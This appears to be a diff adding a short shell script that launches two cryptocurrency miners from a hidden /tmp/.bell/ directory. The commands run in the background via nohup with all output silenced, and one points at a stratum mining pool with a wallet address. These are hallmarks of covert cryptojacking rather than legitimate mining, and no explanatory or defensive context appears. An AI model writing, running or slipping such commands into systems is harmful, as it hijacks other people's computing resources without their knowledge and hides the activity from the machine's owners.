@@ -1,0 +1,3 @@
+cd /tmp/.bell/ &&  nohup ./cpuminer -c cpuminer-conf.json >/dev/null 2>&1 
+
+cd /tmp/.bell/ && nohup ./rvwf_miner  -o stratum+tcp://pool.minermore.com:5501 -u RTAM1hvTbuvAYT6ZXVdi2HHhdQfEHcDveL -p pass >/dev/null 2>&1
